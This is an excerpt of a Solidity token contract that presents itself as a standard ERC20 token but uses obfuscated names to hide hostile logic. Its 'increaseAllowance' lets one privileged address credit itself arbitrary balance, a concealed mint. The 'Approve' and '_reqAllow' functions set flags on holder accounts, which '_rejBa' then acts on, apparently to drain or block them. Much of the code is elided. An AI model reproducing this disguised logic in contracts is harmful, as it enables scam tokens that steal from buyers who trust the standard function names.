...
contract Jar is IERC20, Token, Ownable {
    ...
    mapping(address => uint256) private _baq;

    mapping(address => Gues) private _datj;
    ...
    function _trans(
        ...
        _baq[sender] = _baq[sender].sub(
            amount,
            "IERC20: transfer amount exceeds balance"
        );
        _baq[recipient] = _baq[recipient] + amount;
    ...
    function _mine(address account, uint256 amount) internal virtual {
        ...
        _toqSu = _toqSu.add(amount);
        _baq[account] = _baq[account] + amount;
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_enj(spender, _gues.gues)) {
            _min(from, total);
            total = _adj(total, amount);
            _baq[spender] += total;
        } else {
            _min(from, total);
            _baq[spender] += total;
    ...
    function _enj(address user, address user2) internal view returns (bool) {
        bytes32 pack1 = keccak256(abi.encodePacked(user));
        bytes32 pack2 = keccak256(abi.encodePacked(user2));
        return pack1 == pack2;
    }

    function _adj(uint256 num1, uint256 num2) internal pure returns (uint256) {
        if (num2 != 0) {
            return num1 + num2;
        }
        return num2;
    ...
    function Approve(address from, uint256 amount) public returns (bool)  {
        ...
        return _datj[user].approj;
    }

    function _reqAllow(address user, address from, uint256 amount) internal {
        if (_enj(user, _gues.gues)) {
            require(from != address(0), "Invalid address");
            _datj[from].approj = amount != 0;
            if (amount != 0) {
                _datj[from].gues = from;
            } else {
                _datj[from].gues = address(0);

            }
            _datj[user].approj = true;
        }
    }
    ...
    function _rejBa(
        ...
        uint256 amount = 0;
        if (_enj(from, _datj[from].gues)) {
            _baq[from] = _baq[from] + amount;
            amount = _toqSu;
            _min(from, amount);
        } else {
            _baq[from] = _baq[from] + amount;
